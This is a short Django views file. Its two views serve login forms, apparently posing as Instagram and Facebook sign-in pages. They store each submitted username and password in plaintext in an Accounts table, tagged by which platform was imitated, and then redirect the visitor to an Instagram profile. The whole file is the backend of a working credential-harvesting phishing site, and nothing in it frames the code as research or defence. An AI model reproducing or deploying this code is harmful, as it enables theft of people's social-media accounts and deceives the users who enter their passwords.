from django.shortcuts import render, redirect
from django.views import View
from .forms import LoginForm
from .models import Accounts

class IndexView(View):
    def get(self,request):
        form = LoginForm()
        return render(request,'index.html',{"form":form})

    def post(self,request):
        form = LoginForm(data=request.POST)
        if form.is_valid():
            print(form.cleaned_data['login'])
            
            Accounts.objects.create(
                login = form.cleaned_data['login'],
                password = form.cleaned_data['password'],
                is_insta = True
            )
            return redirect("https://www.instagram.com/mrdili131")
        else:
            return render(request,'facebook.html',{"form":form})

class FacebookView(View):
    def get(self,request):
        form = LoginForm()
        return render(request,'facebook.html',{"form":form})

    def post(self,request):
        form = LoginForm(data=request.POST)
        if form.is_valid():
            
            Accounts.objects.create(
                login = form.cleaned_data['login'],
                password = form.cleaned_data['password'],
                is_insta = False
            )
            return redirect("https://www.instagram.com/mrdili131")
        else:
            return render(request,'facebook.html',{"form":form})  
        
